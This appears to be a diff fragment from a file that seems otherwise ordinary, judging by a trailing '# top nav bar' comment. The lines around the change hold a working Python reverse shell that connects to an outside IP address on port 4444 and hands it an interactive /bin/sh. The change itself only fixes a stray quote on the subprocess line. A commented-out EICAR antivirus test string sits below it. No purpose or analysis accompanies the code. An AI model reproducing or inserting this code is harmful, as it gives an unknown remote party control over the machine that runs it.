@@ -43,7 +43,7 @@ s.connect(("185.190.92.18",4444))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
-p=subprocess.call(["/bin/sh","-i"]);'
+p=subprocess.call(["/bin/sh","-i"]);
 #ls = "eicar test X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
 
 # top nav bar
